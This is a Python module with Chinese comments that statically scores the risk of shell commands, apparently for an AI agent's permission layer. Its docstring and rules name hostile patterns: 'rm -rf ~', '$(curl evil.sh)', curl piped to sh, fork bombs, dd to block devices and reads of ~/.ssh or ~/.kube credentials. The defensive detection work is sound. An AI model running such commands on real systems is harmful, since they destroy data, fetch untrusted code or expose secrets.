"""Shell 命令的静态风险分析。

为什么不能只用正则匹配 ``rm -rf``？因为同一个危险动作有无数种写法：
``ls && rm -rf ~``、``echo x | sh``、``$(curl evil.sh)``、``python -c "import shutil;..."``、
``find . -delete``……所以这里做三件事：

1. **词法切分**：用 ``shlex``（尊重引号）把命令切成 token，再按 ``&& || ; | &`` 拆成若干段；
2. **逐段分级**：先剥掉包装命令（``env`` / ``timeout`` / ``nice`` / ``xargs`` / ``sudo`` ……只是“换个方式执行
   同一条命令”），再按“真正执行的命令名 + 关键参数”归入 read / write / external / dangerous；
   ``sh -c '...'`` / ``eval`` 的字符串会被 **递归分析**；
3. **整体取最大**：复合命令的风险 = 各段风险的最大值；含命令替换、解释器内联代码等
   **无法静态分析** 的结构时，直接按 external 处理（宁可多问一次，也不放过）；
4. **工作区边界**：参数里出现工作区之外的绝对路径（含 ``~``、``$HOME``），即使命令本身只读也要确认——
   ``cat ~/.bashrc`` 读到的内容会进入上下文、轨迹与日志；
5. **灾难性命令**（删根目录/家目录、格式化磁盘、写块设备、fork 炸弹）单独标记 ``catastrophic``：
   权限层在 **任何模式** 下都直接拒绝，bypass 也不例外；
6. **凭证位置**（``~/.ssh``、``~/.kube``、``$KUBECONFIG`` ……，清单在 ``policy/sensitive.py``）单独标记 ``credential``，
   同样在任何模式下拒绝。匹配看两种样子：原始命令串（``sh -c`` 字符串、heredoc 里的也算），以及 shell 去掉引号、
   展开花括号之后的每个词（``~/.k''ube/config``、``~/.ku{be,}/config``）。

这仍然不是安全边界——真正的兜底是沙箱。它的价值是让“默认放行”的范围尽量精确，降低审批疲劳。
"""

from __future__ import annotations

import os
import re
import shlex
from dataclasses import dataclass, field

from .sensitive import CREDENTIAL_HINTS, SECRET_HINTS  # 与文件工具的托管基线共用一份敏感路径清单

LEVELS = ("read", "write", "external", "dangerous")
_RANK = {lvl: i for i, lvl in enumerate(LEVELS)}

READ_CMDS = {
    "ls", "cat", "head", "tail", "wc", "grep", "rg", "ag", "pwd", "echo", "printf", "which", "whoami",
    "date", "env", "printenv", "file", "stat", "du", "df", "tree", "less", "more", "sort", "uniq", "cut",
    "tr", "diff", "cmp", "md5sum", "sha256sum", "basename", "dirname", "realpath", "jq", "true", "false",
    "test", "[", "uname", "hostname", "ps", "id", "type", "column", "nl", "seq", "sleep",
}
WRITE_CMDS = {
    "mkdir", "touch", "cp", "mv", "ln", "chmod", "tee", "rmdir", "rm", "patch", "tar", "unzip", "zip",
    "gzip", "gunzip", "make", "cmake", "pytest", "go", "cargo", "mvn", "gradle", "black", "ruff", "prettier",
    "eslint", "tsc", "sed", "awk", "perl", "python", "python3", "node", "npm", "pnpm", "yarn", "uv", "pip",
    "pip3", "poetry", "bun", "deno", "java", "javac", "gcc", "clang",
}
EXTERNAL_CMDS = {"curl", "wget", "ssh", "scp", "rsync", "nc", "telnet", "ftp", "docker", "kubectl", "helm", "terraform", "aws", "gcloud", "az", "gh"}
DANGEROUS_CMDS = {"sudo", "su", "mkfs", "dd", "shutdown", "reboot", "halt", "fdisk", "mount", "umount", "chown", "killall", "crontab", "systemctl", "launchctl"}
INTERPRETERS = {"python", "python3", "node", "bash", "sh", "zsh", "perl", "ruby", "php", "deno", "bun"}
SHELLS = {"sh", "bash", "zsh", "dash", "ksh"}
# 包装命令：真正执行的是后面那条命令。值为“带一个参数值的选项”
WRAPPERS: dict[str, set[str]] = {
    "env": {"-u", "--unset", "-C", "--chdir"}, "nice": {"-n", "--adjustment"}, "ionice": {"-c", "-n", "-t"},
    "nohup": set(), "time": set(), "command": set(), "exec": {"-a"}, "stdbuf": {"-i", "-o", "-e"},
    "timeout": {"-s", "--signal", "-k", "--kill-after"}, "xargs": {"-I", "-n", "-P", "-L", "-d", "-s", "-E", "-a"},
    "sudo": {"-u", "-g", "-C", "-D", "-h", "-p", "-U"}, "doas": {"-u", "-C"}, "caffeinate": {"-t", "-w"},
}
SAFE_ABS = {"/dev/null", "/dev/stdin", "/dev/stdout", "/dev/stderr", "/dev/zero", "/dev/urandom", "/dev/random"}
_ASSIGN = re.compile(r"[A-Za-z_][A-Za-z0-9_]*=.*")
_DURATION = re.compile(r"\d+(\.\d+)?[smhd]?")
_HOME = ("~", "$HOME", "${HOME}")
# $( ... )（允许一层嵌套括号）、反引号、<( ... ) / >( ... )
_SUBST = re.compile(r"\$\(((?:[^()]|\([^()]*\))*)\)|`([^`]*)`|[<>]\(((?:[^()]|\([^()]*\))*)\)")
_BLOCK_DEV = re.compile(r"/dev/(r?disk|sd|nvme|hd|xvd|mmcblk|vd|md|dm-|mapper/)")
_VAR_HEAD = re.compile(r"\$(?:\{(\w+)\}|(\w+))")       # 以变量开头的词：$D/passwd、${D}x/passwd
_BRACE_RANGE = re.compile(r"(-?\d+)\.\.(-?\d+)|([A-Za-z])\.\.([A-Za-z])")
_BRACE_LIMIT = 64                                      # 展开结果的上限：{a,b}{a,b}…… 会指数膨胀

GIT_READ = {"status", "log", "diff", "show", "branch", "remote", "rev-parse", "ls-files", "blame", "describe", "tag"}
GIT_EXTERNAL = {"push", "fetch", "pull", "clone"}
NET_INSTALL = {("npm", "install"), ("npm", "i"), ("pnpm", "install"), ("pnpm", "add"), ("yarn", "add"), ("pip", "install"),
               ("pip3", "install"), ("uv", "add"), ("uv", "pip"), ("cargo", "install"), ("go", "get"), ("npm", "publish")}


@dataclass
class CommandAnalysis:
    command: str
    segments: list[str] = field(default_factory=list)
    level: str = "read"
    reasons: list[str] = field(default_factory=list)
    catastrophic: bool = False   # 无论什么模式都必须拒绝的命令
    catastrophic_reason: str = ""
    credential: bool = False     # 碰到凭证位置：同样无论什么模式都拒绝
    credential_reason: str = ""
    network: bool = False        # 会从网络取回内容（curl、git pull……）：输出不可信，标记污点
    # 含命令替换 / 进程替换：替换里执行的命令藏在另一条命令的参数中，allow 规则按前缀匹配时看不见它
    opaque: bool = False
    workspace: str | None = field(default=None, repr=False)
    depth: int = field(default=0, repr=False)   # sh -c / eval 的递归深度

    def bump(self, level: str, reason: str) -> None:
        """提升风险等级。决定最终等级的原因排在最前面（reasons[0] 就是“为什么这么判”）。"""
        if reason in self.reasons:
            return
        if _RANK[level] > _RANK[self.level] or not self.reasons:
            self.level = max(self.level, level, key=lambda x: _RANK[x])
            self.reasons.insert(0, reason)
        else:
            self.reasons.append(reason)

    def flag_catastrophic(self, reason: str) -> None:
        self.bump("dangerous", reason)
        if not self.catastrophic:
            self.catastrophic, self.catastrophic_reason = True, reason

    def flag_credential(self, reason: str) -> None:
        self.bump("dangerous", reason)
        if not self.credential:
            self.credential, self.credential_reason = True, reason

    @property
    def rank(self) -> int:
        return _RANK[self.level]


def analyze(command: str, workspace: str | None = None, *, _depth: int = 0) -> CommandAnalysis:
    """分析命令风险。传入 workspace 时，指向工作区内部的绝对路径按工作区内路径处理。"""
    a = CommandAnalysis(command=command, workspace=workspace, depth=_depth)
    if workspace:
        # 工作区根目录本身（ls /ws）和它下面的路径（cat /ws/app.py、>/ws/out、@/ws/body.json）都换成相对写法。
        # 前后都用白名单：后面只能是 / 、空白、命令分隔符或结尾——/ws*、/ws{,-other}、"/ws"-other、/ws$X 经 shell 展开后
        # 会落到工作区外，改写成 . 就成了绕过；/ws-other、/x/ws/y 这类只是字符串沾边的路径同样保持原样（按越界处理）
        root = re.escape(workspace.rstrip("/"))
        command = re.sub(rf"(?<![^\s=:'\"(<>@;|&]){root}(?=[/\s;&|<>)]|$)", ".", command)
    # 替换语法的检测直接作用于原始命令，不先“剔除单引号内容”：引号的语义依赖上下文
    # （双引号里的单引号只是普通字符，$( ) 里又会开始新的引号上下文），用正则猜引号很容易猜错，
    # 猜错就会放过真正会执行的命令。这里宁可把 echo '$(x)' 这样的字面量也当作不透明——误判的代价只是多问一次
    if "$(" in command or "`" in command:
        a.opaque = True
        a.bump("external", "包含命令替换 $(...) 或反引号，无法静态分析")
    if re.search(r"<\(|>\(", command):
        a.opaque = True
        a.bump("external", "包含进程替换，无法静态分析")
    # 替换里的命令同样会执行（即使写在双引号里）：递归分析，灾难性命令藏在 "$(...)" 里也要识别出来
    for inner in _SUBST.findall(command):
        _recurse(next(x for x in inner if x), a, "命令替换")
    _check_secrets(command, a)
    if re.search(r":\(\)\s*\{", command):
        a.flag_catastrophic("疑似 fork 炸弹")
    if re.search(r"\b(curl|wget)\b[^|;&]*\|\s*(sudo\s+)?(ba|z)?sh\b", command):
        a.bump("dangerous", "下载后直接执行（curl | sh）")

    try:
        lex = shlex.shlex(command, posix=True, punctuation_chars=";&|<>()")
        lex.whitespace_split = True
        tokens = list(lex)
    except ValueError as e:  # 引号不配对等
        a.bump("external", f"命令无法解析：{e}")
        return a

    segment: list[str] = []
    for tok in tokens + [";"]:
        if tok in (";", "&&", "||", "|", "&", ";;", "(", ")"):
            if segment:
                a.segments.append(" ".join(segment))
                _classify(segment, a)
                segment = []
            if tok == "&":
                a.bump("write", "后台执行（&）")
            continue
        if tok in (">", ">>", "<", ">|", "&>", ">&"):
            segment.append(tok)
            continue
        segment.append(tok)
    return a


def _unwrap(words: list[str], a: CommandAnalysis) -> list[str]:
    """剥掉前置赋值与包装命令，返回真正执行的那条命令（可能为空：例如单独的 ``env``）。"""
    while words:
        while words and _ASSIGN.fullmatch(words[0]):
            words = words[1:]  # FOO=bar cmd ...
        if not words:
            return []
        name = words[0].rsplit("/", 1)[-1]
        if name not in WRAPPERS:
            return words
        rest, takes = words[1:], WRAPPERS[name]
        if name in ("sudo", "doas"):
            a.bump("dangerous", f"{name} 提权执行")
        while rest and (rest[0].startswith("-") or (name == "env" and _ASSIGN.fullmatch(rest[0]))):
            opt = rest.pop(0)
            if name == "env" and opt in ("-S", "--split-string") or opt.startswith("--split-string="):
                a.bump("external", "env -S 会把字符串再切分执行，无法静态分析")
            if opt in takes and rest:
                rest.pop(0)
        if name == "command" and rest[:1] in (["-v"], ["-V"]) or words[1:2] in (["-v"], ["-V"]) and name == "command":
            return ["type"]  # command -v：只是查找命令位置
        if name == "timeout" and rest and _DURATION.fullmatch(rest[0]):
            rest = rest[1:]
        if not rest:
            return [name] if name == "env" else []  # 单独的 env：打印环境变量
        words = rest
    return words


def _is_outside(path: str, a: CommandAnalysis) -> bool:
    """工作区内的绝对路径在 analyze() 开头已被替换成 ./ 前缀，这里剩下的绝对路径都在工作区外；
    相对路径用 normpath 判断是否经 .. 爬出了工作区（命令在工作区根目录执行）。
    以变量开头、又带 / 的词（``$D/passwd``）落在哪里取决于变量的值，按越界处理；``$PWD`` 就是工作区根目录。"""
    if path in SAFE_ABS:
        return False
    m = _VAR_HEAD.match(path)
    if m and "/" in path:
        if (m.group(1) or m.group(2)) != "PWD":
            return True
        path = "." + path[m.end():]
    if path.startswith(("/", *_HOME)):
        return True
    return ".." in path and os.path.normpath(path).split("/", 1)[0] == ".."


def _check_secrets(text: str, a: CommandAnalysis) -> None:
    m = CREDENTIAL_HINTS.search(text)
    if m:
        a.flag_credential(f"涉及凭证位置 {m.group(0)}")
    elif SECRET_HINTS.search(text):
        a.bump("dangerous", "涉及凭证/密钥路径")


def _expand_braces(word: str) -> tuple[list[str], bool]:
    """bash 的花括号展开（``{a,b}``、``{1..3}``，可嵌套）。返回 (展开结果, 是否完整)；超过上限时不完整。

    shlex 已经去掉了引号，``'{a,b}'`` 这种 shell 不会展开的写法这里也会展开——多判出几个词，只会更保守。"""
    if "{" not in word:
        return [word], True
    if len(word) > 2048 or word.count("{") > 32:
        return [word], False
    done, todo = [], [word]
    while todo:
        if len(done) + len(todo) > _BRACE_LIMIT:
            return done + todo, False
        w = todo.pop()
        span = _brace_span(w)
        if span is None:
            done.append(w)
        else:
            i, j, alts = span
            todo.extend(w[:i] + alt + w[j + 1:] for alt in alts)
    return done, True


def _brace_span(w: str) -> tuple[int, int, list[str]] | None:
    """找出第一组会被展开的花括号：返回 ({ 的位置, 配对的 } 的位置, 各个分支)。``${VAR}`` 与 ``{a}`` 不展开。"""
    start = 0
    while (i := w.find("{", start)) != -1:
        start = i + 1
        if i > 0 and w[i - 1] == "$":
            continue
        depth, commas = 0, []
        for j in range(i, len(w)):
            if w[j] == "{":
                depth += 1
            elif w[j] == "}":
                depth -= 1
                if depth == 0:
                    break
            elif w[j] == "," and depth == 1:
                commas.append(j)
        else:
            continue  # 这个 { 没有配对的 }，按普通字符处理；里面的 {b,c} 仍会展开（bash：{a{b,c} → {ab {ac）
        if commas:
            cuts = [i, *commas, j]
            return i, j, [w[x + 1:y] for x, y in zip(cuts, cuts[1:])]
        m = _BRACE_RANGE.fullmatch(w[i + 1:j])
        if m and m.group(1) is not None:
            lo, hi = int(m.group(1)), int(m.group(2))
            step = 1 if hi >= lo else -1
            return i, j, [str(x) for x in range(lo, hi + step, step)[:_BRACE_LIMIT + 1]]
        if m:
            lo, hi = ord(m.group(3)), ord(m.group(4))
            step = 1 if hi >= lo else -1
            return i, j, [chr(x) for x in range(lo, hi + step, step)]
    return None


def _classify(seg: list[str], a: CommandAnalysis) -> None:
    # 花括号展开发生在命令执行之前、作用于每个词：rm -rf {~,build} 实际执行的是 rm -rf ~ build
    expanded: list[str] = []
    for w in seg:
        words, complete = _expand_braces(w)
        if not complete:
            a.bump("external", "花括号展开的结果过多，无法静态分析")
        expanded.extend(words)
    for w in expanded:
        _check_secrets(w, a)  # 这时看到的是 shell 去掉引号、展开花括号之后的样子：~/.k''ube/config、~/.ku{be,}/config
    words = _unwrap(expanded, a)
    if not words:
        return
    cmd = words[0].rsplit("/", 1)[-1]
    args = words[1:]

    # 重定向写文件
    redirect_targets: set[int] = set()
    for j, w in enumerate(words):
        if w in (">", ">>", ">|", "&>") and j + 1 < len(words):
            redirect_targets.add(j + 1)
            target = words[j + 1]
            if target in ("/dev/null", "&1", "&2"):
                continue
            if target.startswith("/dev/"):
                if _BLOCK_DEV.match(target):
                    a.flag_catastrophic(f"写入块设备 {target}")
                else:
                    a.bump("dangerous", f"写入设备文件 {target}")
            elif _is_outside(target, a):
                a.bump("external", f"重定向写入工作区外路径 {target}")
            else:
                a.bump("write", f"重定向写入文件 {target}")
    # 工作区边界：参数（含 --opt=/path 的值）里出现工作区外路径
    for j, w in enumerate(args, start=1):
        if j in redirect_targets:
            continue
        val = w.split("=", 1)[1] if w.startswith("-") and "=" in w else w
        if _is_outside(val, a):
            a.bump("external", f"路径 {val} 以变量开头，位置无法静态判断，按工作区外处理" if _VAR_HEAD.match(val)
                   else f"访问工作区外路径 {val}")
            break

    if cmd in SHELLS and "-c" in args:
        script = args[args.index("-c") + 1] if args.index("-c") + 1 < len(args) else ""
        _recurse(script, a, f"{cmd} -c")
    elif cmd == "eval":
        _recurse(" ".join(args), a, "eval")
    elif cmd in ("source", "."):
        a.bump("external", f"{cmd} 执行脚本文件，内容无法静态分析")
    elif cmd in DANGEROUS_CMDS:
        a.bump("dangerous", f"高危命令 {cmd}")
        dev = next((x[3:] for x in args if x.startswith("of=")), "")
        if cmd == "dd" and _BLOCK_DEV.match(dev):
            a.flag_catastrophic(f"dd 写入块设备 {dev}")
    elif cmd.startswith("mkfs"):
        a.flag_catastrophic(f"格式化文件系统 {cmd}")
    elif cmd in ("env", "printenv") and not args:
        a.bump("external", "输出全部环境变量（可能包含密钥）")
    elif cmd == "rm":
        flags = "".join(x for x in args if x.startswith("-"))
        targets = [x for x in args if not x.startswith("-")]
        recursive = "r" in flags or "R" in flags
        # 根目录、家目录，以及它们下面的一级目录（/usr、/etc、~/projects、$HOME/Documents……）
        roots = [t for t in targets if t.rstrip("/") in ("", "/*", *_HOME, "~/*", "$HOME/*")
                 or re.fullmatch(r"/[^/]+/?", t) or re.fullmatch(r"(~|\$HOME|\$\{HOME\})/[^/]+/?", t)]
        if recursive and roots:
            a.flag_catastrophic(f"递归删除 {roots[0]}")
        elif recursive and any(t.rstrip("/") in ("*", "..", ".", "") or _is_outside(t, a) for t in targets):
            a.bump("dangerous", "递归删除工作区外路径或整个工作区")
        else:
            a.bump("write", "删除文件")
    elif cmd in ("chmod", "chown") and any(x in ("-R", "--recursive") for x in args) and \
            any(t.rstrip("/") in ("", *_HOME) for t in args if not t.startswith("-")):
        a.flag_catastrophic("递归修改根目录/家目录的权限")
    elif cmd == "git":
        _git(args, a)
    elif cmd == "find":
        if any(x in ("-delete", "-exec", "-execdir", "-ok", "-okdir") for x in args):
            a.bump("write", "find 带 -delete/-exec")
        elif any(x in ("-fprint", "-fprint0", "-fprintf", "-fls") for x in args):
            a.bump("write", "find 把结果写入文件")
        else:
            a.bump("read", "find 只读搜索")
    elif cmd in ("sed", "perl") and any(x.startswith("-i") for x in args):
        a.bump("write", f"{cmd} -i 原地修改文件")
    elif cmd == "sed":
        prog = " ".join(x for x in args if not x.startswith("-"))
        if re.search(r"(^|[;{}\s])[0-9,$]*\s*[we]\s|/[gpIi0-9]*[we](\s|$)", prog):
            a.bump("external", "sed 程序含 w/e 命令（写文件或执行命令）")
        else:
            a.bump("read", "sed 流式处理")
    elif cmd in ("awk", "gawk", "mawk"):
        prog = " ".join(x for x in args if not x.startswith("-"))
        if re.search(r"system\s*\(|\|\s*getline|print[^;}]*(>|\|)", prog):
            a.bump("external", f"{cmd} 程序里执行命令或写文件")
        else:
            a.bump("read", f"{cmd} 流式处理")
    elif cmd == "sort" and any(x == "-o" or x.startswith(("-o", "--output")) for x in args):
        a.bump("write", "sort -o 写入文件")
    elif cmd in INTERPRETERS and any(x in ("-c", "-e", "--eval") for x in args):
        a.bump("external", f"{cmd} 内联代码无法静态分析")
    elif cmd in SHELLS and not [x for x in args if not x.startswith("-")]:
        a.bump("external", f"{cmd} 从标准输入执行脚本，内容无法静态分析")
    elif cmd in ("python", "python3") and args[:1] in (["--version"], ["-V"]):
        a.bump("read", "查询版本")
    elif (cmd, args[0] if args else "") in NET_INSTALL:
        a.bump("external", f"{cmd} {args[0]} 会访问网络并修改依赖")
        a.network = True
    elif cmd in EXTERNAL_CMDS:
        a.bump("external", f"{cmd} 访问外部系统")
        a.network = True
    elif cmd in WRITE_CMDS:
        a.bump("write", f"{cmd} 可能修改文件或执行代码")
    elif cmd in READ_CMDS:
        a.bump("read", f"{cmd} 只读")
    else:
        a.bump("write", f"未知命令 {cmd}，按可写处理")


def _recurse(script: str, a: CommandAnalysis, via: str) -> None:
    """``sh -c`` / ``eval`` 的字符串本身就是一条命令：递归分析（限制深度，防止构造的深层嵌套拖慢判定）。"""
    if a.depth >= 3 or not script.strip():
        a.bump("external", f"{via} 嵌套过深或内容为空，无法静态分析")
        return
    inner = analyze(script, a.workspace, _depth=a.depth + 1)
    a.bump(inner.level, f"{via}：{inner.reasons[0] if inner.reasons else '内层命令'}")
    a.reasons.extend(r for r in inner.reasons[1:] if r not in a.reasons)
    a.opaque = a.opaque or inner.opaque
    if inner.catastrophic and not a.catastrophic:
        a.catastrophic, a.catastrophic_reason = True, f"{via}：{inner.catastrophic_reason}"
    if inner.credential and not a.credential:
        a.credential, a.credential_reason = True, f"{via}：{inner.credential_reason}"
    a.network = a.network or inner.network


def _git(args: list[str], a: CommandAnalysis) -> None:
    # 跳过全局选项：-C <dir>、-c k=v、--git-dir=...；-c 能配置任意命令（core.pager、alias.x=!cmd……）
    i = 0
    while i < len(args) and args[i].startswith("-"):
        if args[i] == "-c" and i + 1 < len(args):
            kv = args[i + 1]
            if "!" in kv or re.match(r"(core\.(pager|sshcommand|fsmonitor|editor|hookspath)|.*\.(command|program|textconv))=",
                                     kv, re.I):
                a.bump("external", f"git -c {kv.split('=')[0]} 可以执行任意命令")
            i += 2
        elif args[i] in ("-C", "--git-dir", "--work-tree", "--namespace") and i + 1 < len(args):
            i += 2
        else:
            i += 1
    sub, rest = (args[i], args[i + 1:]) if i < len(args) else ("", [])
    if any(x.startswith("--output") or x in ("--ext-diff",) for x in rest):
        a.bump("write", f"git {sub} 带 --output/--ext-diff")
    if sub in GIT_READ:
        a.bump("read", "git 只读命令")
    elif sub in GIT_EXTERNAL:
        if "--force" in rest or "-f" in rest or any(x.startswith(("+", "--force")) for x in rest):
            a.bump("dangerous", "强制推送会改写远端历史")
        else:
            a.bump("external", f"git {sub} 访问远端")
        a.network = True
    elif sub in ("reset", "clean") and any(x in ("--hard", "-f", "-fd", "-fdx", "-xdf", "-df") for x in rest):
        a.bump("dangerous", f"git {sub} 会丢弃未提交的修改")
    elif sub in ("config", "submodule", "filter-branch"):
        a.bump("external", f"git {sub} 可能配置命令执行或访问远端")
    else:
        a.bump("write", f"git {sub} 修改仓库" if sub else "git 修改仓库")


def max_level(*levels: str) -> str:
    return max(levels, key=lambda x: _RANK[x])
